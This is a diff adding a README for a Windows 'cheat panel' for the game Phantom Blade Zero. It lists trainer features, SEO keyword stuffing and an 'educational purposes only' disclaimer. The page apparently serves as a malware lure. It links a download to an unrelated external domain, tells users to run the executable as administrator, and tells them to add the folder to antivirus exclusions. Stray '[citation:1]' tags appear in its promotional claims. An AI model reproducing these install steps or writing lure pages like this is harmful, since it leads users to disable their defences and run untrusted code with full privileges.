@@ -1,0 +1,145 @@
+<h1 align="center">⚔️ Phantom Blade Zero Cheat Panel</h1>
+
+<p align="center">
+  <strong>Master The Blade. Skip The Grind.</strong>
+</p>
+
+<p align="center">
+  Windows cheat panel for Phantom Blade Zero.
+  <br>
+  Health Control · Recoil Removal · Sha-Chi Charge · Trainer
+</p>
+
+<p align="center">
+  <a href="https://dyhuiying.com/s/file">
+    <img src="https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-B03A3A?style=for-the-badge&logo=windows&logoColor=white" alt="Phantom Blade Zero Cheat Panel Download">
+  </a>
+</p>
+
+<p align="center">
+  <img src="https://img.shields.io/badge/version-1.0-B03A3A?style=flat-square">
+  <img src="https://img.shields.io/badge/platform-Windows%2010%20%2F%2011-B03A3A?style=flat-square&logo=windows&logoColor=white">
+  <img src="https://img.shields.io/badge/status-active-2ea44f?style=flat-square">
+  <img src="https://img.shields.io/badge/modules-8%2B-252525?style=flat-square">
+</p>
+
+<details>
+<summary>📑 Contents</summary>
+
+- [⚡ Quick Start](#-quick-start)
+- [🖥️ Requirements](#️-requirements)
+- [✨ Key Features](#-key-features)
+- [📋 Module Overview](#-module-overview)
+- [🚀 Why Choose Phantom Blade Zero Cheat Panel](#-why-choose-phantom-blade-zero-cheat-panel)
+- [💡 Why Use It](#-why-use-it)
+- [🎮 About Phantom Blade Zero](#-about-phantom-blade-zero)
+- [❓ FAQ](#-faq)
+- [🔎 SEO Keywords](#-seo-keywords)
+- [⚠️ Disclaimer](#️-disclaimer)
+
+</details>
+
+## ⚡ Quick Start
+
+1. Download the archive from the button above.
+2. Extract it to any folder on your Windows drive.
+3. Right-click the executable and select **Run as administrator**.
+
+The cheat panel opens once Phantom Blade Zero reaches the main menu.
+
+## 🖥️ Requirements
+
+| Component | Minimum |
+|-----------|---------|
+| OS | Windows 10 / 11, 64-bit |
+| RAM | 8 GB |
+| Storage | 100 MB free space |
+| Privileges | Administrator |
+
+## ✨ Key Features
+
+### 🛡️ Survival Control
+- 💚 **Unlimited Health** — freeze HP during cinematic boss fights and enemy encounters.
+- 🛡️ **God Mode** — toggle damage immunity for testing combat routes and boss patterns.
+- 🧪 **Instant Heal** — restore health without consuming limited healing items.
+
+### ⚔️ Combat & Sha-Chi Mods
+- 🔫 **No Recoil** — remove ranged weapon kick during hybrid combat.
+- ⚡ **Instant Sha-Chi Charge** — freeze or refill Sha-Chi meter for continuous special attacks.
+- 🎯 **No Cooldowns** — remove skill and ability cooldown timers.
+
+### 🎛️ Interface Control
+- ⌨️ **Hotkey Panel** — INSERT to toggle, F1–F4 for individual modules.
+- 💾 **Profile Saving** — configurations persist between sessions.
+- 🎨 **Compact Overlay** — panel stays out of the way during combat.
+
+## 📋 Module Overview
+
+| Module | What it does | Hotkey |
+|--------|--------------|--------|
+| Unlimited Health | Freeze current HP | F1 |
+| God Mode | Toggle damage immunity | F2 |
+| No Recoil | Remove ranged weapon kick | F3 |
+| Instant Sha-Chi Charge | Freeze or refill Sha-Chi meter | F4 |
+| No Cooldowns | Remove skill cooldowns | INSERT |
+| Instant Heal | Restore health without items | Mouse4 |
+| Profile Save | Persist current configuration | Mouse5 |
+
+## 🚀 Why Choose Phantom Blade Zero Cheat Panel
+
+- ✅ Built around Phantom Blade Zero's Sha-Chi resource system and cinematic combat flow, not adapted from a generic action RPG trainer.
+- ✅ Instant Sha-Chi charge lets you test every special attack and combo without grinding meter between fights.
+- ✅ No cooldowns removes the ability downtime that interrupts the game's signature fluid combat style.
+- ✅ Lightweight panel that stays responsive during intense boss encounters. Phantom Blade Zero remains one of Steam's most-played action games in November 2026, with a 24-hour peak above 361,000 players [citation:1].
+
+## 💡 Why Use It
+
+- 🎮 Test every combat combo and Sha-Chi ability without meter grinding.
+- 🔍 Learn boss patterns with damage immunity instead of dying repeatedly.
+- 🧭 Push through encounters without resetting after every mistake.
+- ⚡ Toggle modules on the fly when you want a cleaner action experience.
+
+## 🎮 About Phantom Blade Zero
+
+| Field | Detail |
+|-------|--------|
+| Developer | S-GAME |
+| Genre | Action RPG / Wuxia |
+| Modes | Single-player |
+| Platform | Windows, PS5 |
+| Steam Peak | 361,429 (24h peak, Nov 2026) [citation:1] |
+
+Phantom Blade Zero is a fast-paced wuxia action RPG known for its cinematic combat, Sha-Chi resource system, and demanding boss encounters.
+
+## ❓ FAQ
+
+**Do I need to run it as Administrator?**
+Yes — admin rights are required for the overlay to attach.
+
+**Will my antivirus flag the panel?**
+Trainer executables are sometimes flagged due to memory interaction. Add the folder to exclusions if needed.
+
+**Does it work on Windows 11?**
+Yes, the panel is built for Windows 10 and 11, 64-bit.
+
+**Does it work with the latest Phantom Blade Zero patch?**
+The module offsets are maintained against current game builds. Check release notes after major updates.
+
+**How do I update the panel?**
+Download the latest archive and replace the existing files.
+
+## 🔎 SEO Keywords
+
+phantom blade zero cheat, phantom blade zero cheat panel, phantom blade zero trainer, phantom blade zero overlay cheat, phantom blade zero unlimited health, phantom blade zero no recoil, phantom blade zero sha-chi charge, phantom blade zero god mode, phantom blade zero windows cheat, phantom blade zero wuxia tool, phantom blade zero no cooldowns, phantom blade zero instant heal, phantom blade zero configurable cheat, phantom blade zero action rpg cheat, phantom blade zero s-game trainer, phantom blade zero single player trainer, phantom blade zero pc cheat, phantom blade zero trainer panel, phantom blade zero boss cheat
+
+## ⚠️ Disclaimer
+
+This software is provided for educational purposes only. Use it at your own risk.
+
+<p align="center">
+  <strong>⚔️ Phantom Blade Zero Cheat Panel</strong>
+  <br>
+  Health Control · Recoil Removal · Sha-Chi Charge · Trainer
+  <br>
+  Windows Desktop Utility
+</p>
